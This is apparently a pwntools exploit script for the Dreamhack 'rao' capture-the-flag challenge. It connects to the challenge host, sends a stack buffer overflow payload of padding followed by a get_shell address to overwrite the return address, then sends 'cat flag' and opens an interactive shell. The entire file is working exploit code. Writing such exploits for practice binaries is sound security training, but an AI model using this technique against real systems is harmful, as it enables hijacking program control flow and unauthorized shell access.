from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./rao")
p = remote("host3.dreamhack.games", 18436)
#gdb.attach(p,api=True)
get_shell = 0x00000000004006aa
payload = b'a'*0x38 + p64(get_shell)

p.sendline(payload)
p.sendline("cat flag")
p.interactive()
